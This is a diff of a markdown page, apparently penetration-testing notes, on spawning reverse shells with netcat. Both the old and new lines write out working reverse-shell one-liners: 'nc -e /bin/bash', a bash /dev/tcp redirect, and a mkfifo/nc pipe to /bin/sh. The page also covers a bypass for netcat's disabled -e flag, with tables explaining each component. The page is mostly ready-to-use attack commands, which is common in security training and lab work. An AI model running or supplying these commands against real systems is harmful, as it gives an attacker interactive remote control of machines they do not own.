@@ -11,8 +11,12 @@ description: Creating reverse shells with netcat
 The simplest command to spawn the shell is&#x20;
 
 ```shell
-nc {ATTACKER-IP} {PORT} -e /bin/bash
+nc $IP $PORT -e /bin/bash
 ```
+
+* `$IP` is the IP address of the attacker's machine (where the shell is "caught")
+* `$PORT` is the listening port on the attacking machine
+* May type out IP address and port directly in command instead of creating session variables if desired
 
 The `-e /bin/bash` portion of the command instructs Netcat to pass any input from the user directly on to the program `/bin/bash`.
 
@@ -20,27 +24,37 @@ Often the machine will have the `-e` flag disabled thus preventing this straight
 
 ## Disabled Execution Bypass
 
-For obvious reasons the `-e` flag presents a huge security risk for netcat installations and is thus often disabled by default. Should the flag be disabled its functionality can be replicated via some creativity in the command line.
+For obvious reasons the `-e` flag presents a huge security risk for Netcat installations and is thus often disabled by default. Should the flag be disabled its functionality can be replicated via some creativity in the command line.
 
 ### Method 1 (Linux)
 
-This method is somewhat unreliable but can be tried as a first attempt.
+This method is somewhat unreliable but can be tried as a first attempt. The following command is run on the target (assuming attacker has opened a listener to catch the shell on their own machine already)
 
 ```bash
-user@target:~$ bash -i >& /dev/tcp/{Listener-IP}/{PORT} 0>&1
+bash -i >& /dev/tcp/$IP/$PORT 0>&1
 ```
 
-<table><thead><tr><th width="196">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>-i</code></td><td>Makes shell interactive</td></tr><tr><td><code>/dev/tcp/...</code></td><td>Some older Linux distros allow network access via the <code>/dev/tcp/&#x3C;IP>/&#x3C;PORT></code> file path </td></tr><tr><td><code>0>&#x26;1</code></td><td>Binds STDIN and STDOUT together (and to the listening port)</td></tr></tbody></table>
+* `$IP` is the IP address of the attacker's machine (where the shell is "caught")
+* `$PORT` is the listening port on the attacking machine
+* May type out IP address and port directly in command instead of creating session variables if desired
+
+<table><thead><tr><th width="196">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>-i</code></td><td>Makes shell interactive</td></tr><tr><td><code>/dev/tcp/...</code></td><td>Some older Linux distros allow network access via the <code>/dev/tcp/$IP/$PORT</code> file path </td></tr><tr><td><code>0>&#x26;1</code></td><td>Binds STDIN and STDOUT together (and to the listening port)</td></tr></tbody></table>
 
 ### Method 2 (Linux)
 
-This method tends to be a more reliable bypass.
+This method tends to be a more reliable bypass. The following command is run on the target to create the "callback"
 
+{% code overflow="wrap" %}
 ```bash
-user@target:~$ mkfifo /tmp/f; nc {IP} {PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
+{% endcode %}
 
-<table><thead><tr><th width="194">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>mkfifo /tmp/f</code></td><td>Creates a named pipe at <code>/tmp/f</code></td></tr><tr><td><code>nc {IP} {PORT}</code></td><td>Invokes netcat and points it at the IP and PORT of the listener</td></tr><tr><td><code>&#x3C; /tmp/f</code></td><td>Redirects output of named pipe (<code>/tmp/f</code>) into netcat connection (returns it to attacker via network)</td></tr><tr><td><code>| /bin/sh</code></td><td>Pipes the output from netcat to the input of <code>/bin/sh</code></td></tr><tr><td><code>> /tmp/f</code></td><td>Redirects the output from /bin/sh to named pipe</td></tr><tr><td><code>2>&#x26;1</code></td><td>Binds (<code>>&#x26;</code> operator) the stderr (output number 2) and the stdout (output number 1).<br><br>Both are going into <code>/tmp/f</code> per step above.</td></tr><tr><td><code>rm /tmp/f</code></td><td>The named pipe persists as long as the shell connection is active (held in a loop by the redirects).<br><br>Once the connection is broken this ensures the named pipe (created by the attacker) is removed from the target system.</td></tr></tbody></table>
+* `$IP` is the IP address of the attacker's machine (where the shell is "caught")
+* `$PORT` is the listening port on the attacking machine
+* May type out IP address and port directly in command instead of creating session variables if desired
+
+<table><thead><tr><th width="194">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>mkfifo /tmp/f</code></td><td>Creates a named pipe at <code>/tmp/f</code></td></tr><tr><td><code>nc $IP $PORT</code></td><td>Invokes netcat and points it at the IP and PORT of the listener</td></tr><tr><td><code>&#x3C; /tmp/f</code></td><td>Redirects output of named pipe (<code>/tmp/f</code>) into netcat connection (returns it to attacker via network)</td></tr><tr><td><code>| /bin/sh</code></td><td>Pipes the output from netcat to the input of <code>/bin/sh</code></td></tr><tr><td><code>> /tmp/f</code></td><td>Redirects the output from /bin/sh to named pipe</td></tr><tr><td><code>2>&#x26;1</code></td><td>Binds (<code>>&#x26;</code> operator) the <code>stderr</code> (output number 2) and the <code>stdout</code> (output number 1).<br><br>Both are going into <code>/tmp/f</code> per step above.</td></tr><tr><td><code>rm /tmp/f</code></td><td>The named pipe persists as long as the shell connection is active (held in a loop by the redirects).<br><br>Once the connection is broken this ensures the named pipe (created by the attacker) is removed from the target system.</td></tr></tbody></table>
 
 ## Stabilization Techniques
 
